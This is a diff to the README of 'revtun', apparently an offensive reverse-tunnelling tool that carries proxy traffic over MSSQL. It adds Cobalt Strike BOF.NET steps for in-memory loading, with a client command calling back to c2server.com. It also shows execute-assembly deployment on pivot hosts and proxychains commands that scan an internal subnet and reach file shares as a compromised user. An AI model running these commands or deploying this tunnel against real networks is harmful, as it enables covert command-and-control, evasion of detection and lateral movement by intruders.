@@ -24,18 +24,21 @@ dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:Publis
 
 # Cobalt Strike (.NET Framework 4.8)
 dotnet build -c Release -f net48 -p:Platform=AnyCPU
+
+# Windows x64 optimized for minimal size (remove the net48 references from revtun.csproj before compiling this way)
+dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -p:PublishTrimmed=true
 ```
 
 ## Usage
 
 ### Server
 ```bash
-./revtun server --password test123
+./revtun server --password testpass
 ```
 
 ### Client 
 ```bash
-./revtun client --host target-server.com --password test123
+./revtun client --host target-server.com --password testpass
 ```
 
 ### Relay (Traffic Forwarding)
@@ -49,20 +52,59 @@ proxychains nmap -sT 192.168.1.0/24
 proxychains smbclient -U compromised_user //target.internal.fileserver/Share
 ```
 
-## C2 Integration (e.g. execute-assembly from Cobalt Strike)
+## Cobalt Strike Integration
 
-### Deployment
+### execute-assembly (not opsec in default config)
 ```bash
 # Client from internal network  
-execute-assembly revtun.exe client --host [internal-compromised-host/external-sql-server] --password test123
+execute-assembly revtun.exe client --host [internal-compromised-host/external-sql-server] --password testpass
 
 # Relay on pivot host
 execute-assembly revtun.exe relay --host [external-sql-server] 
 ```
 
+### BOF.NET (in memory execution without creating new processes)
+#### Project
+Original: https://github.com/williamknows/BOF.NET
+Can run EXEs: https://github.com/williamknows/BOF.NET
+
+#### Requirements
+1. Build the BOF.NET DLL (requires .NET Framework 3.5 SP1): 
+```
+BOF.NET\managed\BOFNET.sln
+```
+2. Build object files. (instructions in github project)
+3. Place all files in one folder:
+```txt
+bofnet.cna
+BOFNET.dll
+bofnet_execute.cpp.x86.obj
+bofnet_execute.cpp.x64.obj
+```
+4. Import `bofnet.cna` into Cobalt Strike.
+
+#### Run
+```
+# initialise BOF.NET
+bofnet_init
+
+# Load the .NET assembly
+bofnet_load /path/to/revtun.exe
+
+# (Optionally) list the loaded assemblies to check the name
+bofnet_listassemblies
+
+# Run the assembly. Note: the beacon will not call back after this.
+bofnet_executeassembly revtun client -h c2server.com --password testpass
+```
+
+#### Reference
+https://williamknowles.io/bofnet_executeassembly-native-in-process-execution-of-net-assemblies-in-cobalt-strike/
+
 ## Command Options
 ```
 SERVER OPTIONS:
+  --password <pass>          Password for authentication (REQUIRED)
   --port, -p <port>          MSSQL server port (default: 1433)
   --proxy-port <port>        Proxy listener port (default: 1080)
   --bind <address>           Bind address (default: 0.0.0.0)
@@ -71,10 +113,10 @@ SERVER OPTIONS:
   --no-encryption            Disable TLS encryption support
 
 CLIENT OPTIONS:
+  --password <pass>          Password for authentication (REQUIRED)
   --host, -h <hostname>      Server hostname (default: localhost)
   --port, -p <port>          Server port (default: 1433)
   --username, -u <user>      SQL username (default: sa)
-  --password <pass>          Password for authentication (REQUIRED)
   --database, -d <db>        Database name (default: master)
   --auto-exit                Exit after connection test
   --verbose, -v              Enable verbose logging
